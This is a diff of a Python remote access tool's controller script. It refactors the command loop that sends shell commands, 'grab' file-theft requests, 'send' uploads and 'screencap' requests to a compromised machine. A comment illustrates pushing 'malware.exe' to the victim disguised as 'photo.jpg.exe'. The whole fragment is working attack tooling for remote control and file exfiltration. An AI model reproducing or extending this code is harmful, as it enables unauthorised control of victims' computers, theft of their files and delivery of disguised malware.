@@ -37,16 +37,14 @@ def connect():
             command = input("Shell> ")
         commandList = command.split()
 
+        mySocket.send(command.encode())
         if 'terminate' == commandList[0]:
-            mySocket.send('terminate'.encode())
             break
 
         # Command format: grab <File Path>
         # Example: grab C:\Users\user\Desktop\file.txt
         elif 'grab' == commandList[0]:
             try:
-                mySocket.send(command.encode())
-
                 remotePath = ' '.join(commandList[1:])
                 fileName = os.path.basename(remotePath)
                 destinationFile = os.path.join(destinationPath, fileName)
@@ -61,17 +59,14 @@ def connect():
         # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
         elif 'send' in commandList[0]:
             localPath = commandList[1]
-            mySocket.send(command.encode())
             sendFile(mySocket, localPath)
 
         elif 'screencap' == commandList[0]:
-            mySocket.send(command.encode())
             # just using path here for the name
             path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
             receiveFile(mySocket, path)
 
         else:
-            mySocket.send(command.encode())
             print(mySocket.recv(chunksize).decode())
 
 def main():
